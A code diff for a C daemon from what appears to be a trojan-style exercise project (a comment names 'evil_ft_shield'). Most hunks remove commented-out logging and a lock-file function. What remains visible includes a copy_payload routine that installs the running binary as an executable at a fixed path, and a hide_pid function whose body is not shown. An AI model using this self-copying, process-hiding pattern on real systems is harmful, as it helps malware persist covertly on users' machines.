@@ -12,7 +12,6 @@ t_daemon *create_daemon( void ) {
 	
 	return daemon;
 }
-// TODO delete evil_ft_shield or make another logic
 // From the original Daemonize function
 /* (This function forks, and if the fork(2) succeeds, the parent
 			 calls _exit(2), so that further errors are seen by the child
@@ -25,23 +24,19 @@ void copy_payload(char *curdir) {
 		int in_fd = open(curdir, O_RDONLY);
 		int out_fd = open(EXECUTABLE_FILE, O_WRONLY | O_TRUNC | O_CREAT, 0755);
 		if (in_fd < 0 || out_fd < 0) {
-			//logger.log_entry("Error copying executable", "ERROR");
 			exit(EXIT_FAILURE);
 		}
 		// get size
 		struct stat st;
 		fstat(in_fd, &st);
 		if (sendfile(out_fd, in_fd, NULL, st.st_size) < 0) {
-			//logger.log_entry("Error copying executable", "ERROR");
 			exit(EXIT_FAILURE);
 		}
 		if (close(in_fd) < 0 || close(out_fd) < 0) {
-			//logger.log_entry("Error closing executable", "ERROR");
 			exit(EXIT_FAILURE);
 		}
 	}
 	else {
-		//logger.log_entry("File already exists", "DEBUG");
 		printf("DEBUG: File already exists\n");
 	}
 }
@@ -85,35 +80,12 @@ void hide_pid(void) {
 }
 
 void ft_daemonize(void) {
-	pid_t pid = fork(); 
+	pid_t pid = fork();
 
 	if (pid == -1) { 
-		//logger.log_entry(strerror(errno), "ERROR");
 		exit(EXIT_FAILURE); 
 	} 
-	if (pid > 0) { 
+	if (pid > 0) {
 		exit(EXIT_SUCCESS);
-	}
-	//logger.log_entry("Entering Daemon mode", "INFO");
-	//logger.log_entry("started. PID: " + std::to_string(getpid()) + ".", "INFO");
-}
-
-// https://stackoverflow.com/questions/1599459/optimal-lock-file-method
-void create_lock_file(t_daemon *daemon) {
-	// create file
-	daemon->_lock_file_fd = open(LOCK_FILE, O_RDWR | O_CREAT, 0666);
-	if (daemon->_lock_file_fd < 0) {
-		perror( "Can't open or creating: "LOCK_FILE);
-		//logger.log_entry("Error creating lock file", "ERROR");
-		//logger.log_entry("Quitting", "INFO");
-		exit(EXIT_FAILURE);
-	}
-	// lock file
-	if (flock(daemon->_lock_file_fd, LOCK_EX | LOCK_NB) == -1)
-	{
-        perror( "Can't open: "LOCK_FILE);
-		//logger.log_entry("Error file locked", "ERROR");
-		//logger.log_entry("Quitting", "INFO");
-		exit(EXIT_FAILURE);
 	}
 }
